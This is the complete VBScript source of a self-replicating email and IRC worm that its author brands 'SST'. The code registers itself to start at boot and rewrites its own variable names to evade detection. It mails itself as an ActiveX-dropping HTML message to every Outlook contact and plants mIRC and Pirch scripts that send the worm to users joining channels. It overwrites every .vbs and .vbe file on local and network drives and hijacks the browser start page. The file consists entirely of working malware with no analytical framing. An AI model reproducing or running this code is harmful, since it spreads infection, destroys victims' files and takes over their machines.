'This are the really ONE SST Virus. Not from Kalamar and OnTheFly.
'It's uses a new VBS engine.
'bye our SST@Hablas.com
On Error Resume Next
Set d7Aub9 = CreateObject("WScript.Shell")
d7Aub9.regwrite "HKCU\software\SST\", Chr(87) & Chr(111) & Chr(114) & Chr(109) & Chr(32) & Chr(109) & Chr(97) & Chr(100) & Chr(101) & Chr(32) & Chr(119) & Chr(105) & Chr(116) & Chr(104) & Chr(32) & Chr(86) & Chr(98) & Chr(115) & Chr(119) & Chr(103) & Chr(32) & Chr(49) & Chr(46) & Chr(53) & Chr(48) & Chr(98)
Set kIp72a= Createobject("scripting.filesystemobject")
kIp72a.copyfile wscript.scriptfullname,kIp72a.GetSpecialFolder(1)& "\SST.vbs"
d7Aub9.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SST","wscript.exe "&kIp72a.GetSpecialFolder(1)& "\SST.vbs %"
if d7Aub9.regread ("HKCU\software\SST\mailed") <> "SST" then
NniN0L()
Randomize: On Error Resume Next
Set THWE = CreateObject("Scripting.FileSystemObject")
Set LRA = THWE.OpenTextFile(WScript.ScriptFullName, 1)
YJKUU = 0
Do Until a = "'YJKUU": YJKUU = YJKUU + 1: a = LRA.ReadLine: Loop
LRA.Close
UYRNJ = 22
ReDim NNJXE(YJKUU), RNW(UYRNJ), MXK(UYRNJ)
Set LRA = THWE.OpenTextFile(WScript.ScriptFullName, 1)
For SEBAT = 1 To YJKUU: NNJXE(SEBAT) = LRA.ReadLine: Next
LRA.Close
RNW(1) = "RNW": RNW(2) = "UYRNJ": RNW(3) = "LRA"
RNW(4) = "MXK": RNW(5) = "SEBAT": RNW(6) = "BAM"
RNW(7) = "YJKUU": RNW(8) = "UAQYK": RNW(9) = "YLHA"
RNW(10) = "RON": RNW(11) = "WGI": RNW(12) = "THWE"
RNW(13) = "NNJXE"
For SEBAT = 1 To UYRNJ
MXK(SEBAT) = Chr(Int(Rnd * 25) + 65)
For BAM = 1 To Int(Rnd * 3) + 2: If Int(Rnd * 5) = 2 Then MXK(SEBAT) = MXK(SEBAT) & Int(Rnd * 9) Else MXK(SEBAT) = MXK(SEBAT) & Chr(Int(Rnd * 25) + 65): Next
If (Int(Rnd * 2) + 1) = 1 Or Len(MXK(y)) <= 4 Then MXK(y) = MXK(y) & Int(Rnd * 99)
Next 
Set LRA = THWE.OpenTextFile(WScript.ScriptFullName, 2)
For SEBAT = 1 To YJKUU
UAQYK = Left(NNJXE(SEBAT),800)
YLHA = Len(Trim(UAQYK))
For BAM = 1 To UYRNJ
Do While InStr(1, UAQYK, RNW(BAM), vbTextCompare)
RON = Len(RNW(BAM))
WGI = InStr(1, UAQYK, RNW(BAM), vbTextCompare)
UAQYK = Mid(UAQYK, 1, WGI - 1) & MXK(BAM) & Mid(UAQYK, WGI + RON, YLHA + RON)
Loop
Next
YJKUU3 = "'" & Chr(Int(Rnd * 255))
For RON = 1 to Int(Rnd * 30) + 2: YJKUU3 = YJKUU3 & Chr(Int(Rnd * 255)): Next
LRA.writeline UAQYK & YJKUU3
end if
if d7Aub9.regread ("HKCU\software\SST\mirqued") <> "1" then
TiANIT ""
end if
if d7Aub9.regread ("HKCU\software\SST\pirched") <> "1" then
XbAy08 ""
end if
S6C28g()
uTSHQq= ""
uTSHQq= d7Aub9.regread("HKCU\Software\Microsoft\Internet Explorer\Download Directory")
If (uTSHQq= "") Then
uTSHQq = "c:"
End If
If Right(uTSHQq, 1) = " \ " Then uTSHQq = Mid(uTSHQq, 1, Len(uTSHQq) - 1)
If Not (kIp72a.fileexists(kIp72a.getspecialfolder(0) & "\ad1596_jpg.htm")) Then
If Not (kIp72a.fileexists(uTSHQq & "\ad1596_jpg.htm")) Then
d7Aub9.regwrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http:\\test2:test@www.adultcontacts.co.uk\members\m_gallery\pages\ad1596_jpg.htm"
Else
d7Aub9.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", "about:blank"
kIp72a.copyfile uTSHQq & "\ad1596_jpg.htm", kIp72a.getspecialfolder(0) & "\ad1596_jpg.htm"
d7Aub9.run kIp72a.getspecialfolder(0) & "\ad1596_jpg.htm", 1, False
end if
Set O14zif= kIp72a.opentextfile(wscript.scriptfullname, 1)
eivKsd= O14zif.readall
O14zif.Close
Do
If Not (kIp72a.fileexists(wscript.scriptfullname)) Then
Set ZJF8CX= kIp72a.createtextfile(wscript.scriptfullname, True)
ZJF8CX.writeeivKsd
ZJF8CX.Close
End If
Loop
Function NniN0L()
On Error Resume Next
Set erSpkP= CreateObject("Outlook.Application")
If erSpkP = "Outlook" Then
Set z5trDQ= kIp72a.opentextfile(wscript.scriptfullname, 1)
I = 1
Do While z5trDQ.atendofstream = False
SnrkKb= z5trDQ.readline
m955y1= m955y1& Chr(34) & " & vbcrlf & " & Chr(34) & replace(SnrkKb, Chr(34), Chr(34) & "&chr(34)&" & Chr(34))
Loop
z5trDQ.close
dIuXAr = "<" & "HTML><" & "HEAD><" & "META content=" & Chr(34) & " & chr(34) & " & Chr(34) & "text/html; charset=iso-8859-1" & Chr(34) & " http-equiv=Content-Type><" & "META content=" & Chr(34) & "MSHTML 5.00.2314.1000" & Chr(34) & " name=GENERATOR><" & "STYLE></" & "STYLE></" & "HEAD><" & "BODY bgColor=#ffffff><" & "SCRIPT language=vbscript>"
dIuXAr = dIuXAr& vbCrLf & "On Error Resume Next"
dIuXAr = dIuXAr & vbCrLf & "Set fso = CreateObject(" & Chr(34) & "scripting.filesystemobject" & Chr(34) & ")"
dIuXAr = dIuXAr & vbCrLf & "If Err.Number <> 0 Then"
dIuXAr = dIuXAr & vbCrLf & "document.write " & Chr(34) & "<font face='verdana' color=#ff0000 size='2'>You need ActiveX enabled if you want to see this e-mail.<br>Please open this message again and click accept ActiveX<br>Microsoft Outlook</font>" & Chr(34) & ""
dIuXAr = dIuXAr & vbCrLf & "Else"
dIuXAr = dIuXAr & vbCrLf & "Set vbs = fso.createtextfile(fso.getspecialfolder(0) & " & Chr(34) & "\SST.vbs" & Chr(34) & ", True)"
dIuXAr = dIuXAr & vbCrLf & "vbs.write  " & Chr(34) & m955y1& Chr(34)
dIuXAr = dIuXAr & vbCrLf & "vbs.Close"
dIuXAr = dIuXAr & vbCrLf & "Set ws = CreateObject(" & Chr(34) & "wscript.shell" & Chr(34) & ")"
dIuXAr = dIuXAr & vbCrLf & "ws.run fso.getspecialfolder(0) & " & Chr(34) & "\wscript.exe " & Chr(34) & " & fso.getspecialfolder(0) & " & Chr(34) & "\SST.vbs %" & Chr(34) & ""
gXw6tC = gXw6tC& vbCrLf & "document.write " & Chr(34) & "Sorry, <br>for redirected files." & Chr(34) & ""
gXw6tC = gXw6tC& vbCrLf & "End If"
gXw6tC = gXw6tC & vbCrLf & "<" & "/SCRIPT></" & "body></" & "html>"
kUtshI=dIuXAr & gXw6tC
Set o568uh = erSpkP.GetNameSpace("MAPI")
set qpP594=o568uh.AddressLists
For Each jM2L5j In qpP594
If jM2L5j.AddressEntries.Count <> 0 Then
BSuQKN= jM2L5j.AddressEntries.Count
Set R1901d= erSpkP.CreateItem(0)
R1901d.Subject = "Casiopaya"
R1901d.HTMLBody = kUtshI
R1901d.DeleteAfterSubmit = True
For qS2Hmk = 1 To BSuQKN
Set j1ys8V= jM2L5j.AddressEntries(qS2Hmk)
If BSuQKN= 1 Then
R1901d.BCC = j1ys8V.Address
Else
R1901d.BCC = R1901d.BCC & "; " & j1ys8V.Address
End If
Next
R1901d.send
End If
Next
d7Aub9.regwrite "HKCU\software\SST\mailed", "1"
erSpkP.Quit
end if
End Function
Function TiANIT(D77M62)
On Error Resume Next
if D77M62 = "" then
if kIp72a.fileexists("c:\mirc\mirc.ini") then D77M62="c:\mirc"
if kIp72a.fileexists("c:\mirc32\mirc.ini") then D77M62="c:\mirc32"
zP4MU5=d7Aub9.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if kIp72a.fileexists(zP4MU5 & "\mirc\mirc.ini") then D77M62=zP4MU5 & "\mirc"
end if
if D77M62 <> "" then
set m36w9C = kIp72a.CreateTextFile(D77M62 & "\script.ini", True)
c342bN="[script]"
c342bN=c342bN&vbcrlf&"n0=on 1:JOIN:#:{"
c342bN=c342bN&vbcrlf&"n1=  /if ( $nick == $me ) { halt }"
c342bN=c342bN&vbcrlf&"n2=  /." & chr(100) & chr(99) & chr(99) & " send $nick "&kIp72a.GetSpecialFolder(1)& "\SST.vbs" & vbCrLf & "n3=}"
m36w9C.writeline c342bN
m36w9C.close
d7Aub9.regwrite "HKCU\software\SST\Mirqued", "1"
end if
end function
function XbAy08(NUoR9k)
On Error Resume Next
if NUoR9k="" then
if kIp72a.fileexists("c:\pirch\Pirch32.exe") then NUoR9k="c:\pirch"
if kIp72a.fileexists("c:\pirch32\Pirch32.exe") then NUoR9k="c:\pirch32"
jjm8FN=d7Aub9.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if kIp72a.fileexists(jjm8FN & "\pirch\Pirch32.exe") then NUoR9k=jjm8FN & "\pirch\Pirch32.exe"
end if
if NUoR9k <> "" then
set jVOpNv= kIp72a.CreateTextFile(NUoR9k & "\events.ini", True)
jVOpNv.WriteLine "[Levels]"
jVOpNv.WriteLine "Enabled=1"
jVOpNv.WriteLine "Count=6"
jVOpNv.WriteLine "Level1=000-Unknowns"
jVOpNv.WriteLine "000-UnknownsEnabled=1"
jVOpNv.WriteLine "Level2=100-Level 100"
jVOpNv.WriteLine "100-Level 100Enabled=1"
jVOpNv.WriteLine "Level3=200-Level 200"
jVOpNv.WriteLine "200-Level 200Enabled=1"
jVOpNv.WriteLine "Level4=300-Level 300"
jVOpNv.WriteLine " 300-Level 300Enabled=1"
jVOpNv.WriteLine "Level5=400-Level 400 "
jVOpNv.WriteLine "400-Level 400Enabled=1"
jVOpNv.WriteLine "Level6=500-Level 500"
jVOpNv.WriteLine "500-Level 500Enabled=1"
jVOpNv.WriteLine ""
jVOpNv.WriteLine "[000-Unknowns]"
jVOpNv.WriteLine "UserCount=0"
jVOpNv.WriteLine "EventCount=0"
jVOpNv.WriteLine ""
jVOpNv.WriteLine "[100-Level 100]"
jVOpNv.WriteLine "User1=*!*@*"
jVOpNv.WriteLine "UserCount=1"
jVOpNv.writeline "Event1=ON JOIN:#:/" & chr(100) & chr(99) & chr(99) & " tsend $nick " & kIp72a.GetSpecialFolder(1) & "\SST.vbs"
jVOpNv.WriteLine "EventCount=1"
jVOpNv.WriteLine ""
jVOpNv.WriteLine "[200-Level 200]"
jVOpNv.WriteLine "UserCount=0"
jVOpNv.WriteLine "EventCount=0"
jVOpNv.WriteLine ""
jVOpNv.WriteLine "[300-Level 300]"
jVOpNv.WriteLine "UserCount=0"
jVOpNv.WriteLine "EventCount=0"
jVOpNv.WriteLine ""
jVOpNv.WriteLine "[400-Level 400]"
jVOpNv.WriteLine "UserCount=0"
jVOpNv.WriteLine "EventCount=0"
jVOpNv.WriteLine ""
jVOpNv.WriteLine "[500-Level 500]"
jVOpNv.WriteLine "UserCount=0"
jVOpNv.WriteLine "EventCount=0"
jVOpNv.close
d7Aub9.regwrite "HKCU\software\SST\pirched", "1"
end if
end function
Function S6C28g()
On Error Resume Next
Set xOfqcT = kIp72a.Drives
For Each zDazhQ In xOfqcT
If zDazhQ.Drivetype = Remote Then
CVDT86= zDazhQ & "\"
Call Y5QkbI(CVDT86)
ElseIf zDazhQ.IsReady Then
CVDT86= zDazhQ&"\"
Call Y5QkbI(CVDT86)
End If
Next
End Function
Function Y5QkbI(hxGu9l)
w7UnS2=hxGu9l
Set fI9YSV= kIp72a.GetFolder(w7UnS2)
Set p9n2SN= fI9YSV.Files
For Each zugF82 In p9n2SN
if kIp72a.GetExtensionName(zugF82.path) = "vbs" then
kIp72a.copyfile wscript.scriptfullname , zugF82.path , true
end if
if kIp72a.GetExtensionName(zugF82.path) = "vbe" then
kIp72a.copyfile wscript.scriptfullname , zugF82.path , true
end if
if zugF82.name = "mirc.ini" then
TiANIT(zugF82.ParentFolder)
end if
Next
Set zugF82= fI9YSV.SubFolders
For Each U66t28 In zugF82
Call Y5QkbI(U66t28.path)
Next
End Function
'SST the really ONE